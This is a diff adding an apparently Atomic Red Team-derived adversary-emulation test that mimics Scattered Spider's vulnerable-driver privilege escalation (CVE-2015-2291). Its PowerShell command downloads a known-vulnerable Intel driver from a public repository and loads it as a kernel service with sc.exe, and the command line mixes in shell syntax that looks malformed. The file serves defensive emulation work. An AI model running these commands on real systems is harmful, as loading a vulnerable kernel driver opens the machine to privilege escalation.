@@ -1,0 +1,56 @@
+- id: 1c9ef3e6-bde6-402c-83bc-d89ea8bfd372
+  name: Scattered Spider BYOVD (CVE-2015-2291 for Intel Ethernet Diagnostics Driver)
+  description: Observed TTP of threat actor Scattered Spider, where a an older, legitimate,
+    cryptographically signed Intel driver with a known vulnerability is downloaded
+    and run to escalate privileges
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1068
+    name: Exploitation for Privilege Escalation
+  platforms:
+    windows:
+      psh:
+        command: 'if(Test-Path "PathToAtomicsFolder\..\ExternalPayloads\iqvw64e.sys")
+          {; exit 0; } else {; exit 1; }; then : ; else $parentpath = Split-Path "PathToAtomicsFolder\..\ExternalPayloads\iqvw64e.sys";
+          New-Item -Type Directory $parentpath -ErrorAction Ignore -Force | Out-Null;
+          $DriverURL = "https://github.com/magicsword-io/LOLDrivers/blob/main/drivers/c796a92a66ec725b7b7febbdc13dc69b.bin?raw=true";
+          Invoke-WebRequest -Uri $DriverURL -OutFile "PathToAtomicsFolder\..\ExternalPayloads\iqvw64e.sys";
+          fi; sc.exe create iqvw64e.sys binPath="PathToAtomicsFolder\..\ExternalPayloads\iqvw64e.sys"
+          type=kernel; sc.exe start iqvw64e.sys'
+        cleanup: sc.exe stop iqvw64e.sys; sc.exe delete iqvw64e.sys; Remove-Item -Recurse
+          "#{driver_path}" -ErrorAction Ignore
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - privilege-escalation
+  - atomic-red-team
+  - t1068
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      driver_path:
+        description: Path to vulnerable Intel driver
+        type: path
+        default: PathToAtomicsFolder\..\ExternalPayloads\iqvw64e.sys
+    dependencies:
+    - description: 'Intel driver must exist on disk at the specified location (#{driver_path})
+
+        '
+      prereq_command: "if(Test-Path \"#{driver_path}\") {\n    exit 0\n} else {\n\
+        \    exit 1\n}\n"
+      get_prereq_command: '$parentpath = Split-Path "#{driver_path}"
+
+        New-Item -Type Directory $parentpath -ErrorAction Ignore -Force | Out-Null
+
+        $DriverURL = "https://github.com/magicsword-io/LOLDrivers/blob/main/drivers/c796a92a66ec725b7b7febbdc13dc69b.bin?raw=true"
+
+        Invoke-WebRequest -Uri $DriverURL -OutFile "#{driver_path}"
+
+        '
+    technique_created: '2017-05-31T21:30:55.066Z'
+    atomic_guid: 1c9ef3e6-bde6-402c-83bc-d89ea8bfd372
+    import_timestamp: '2026-09-05T06:41:04.863617Z'
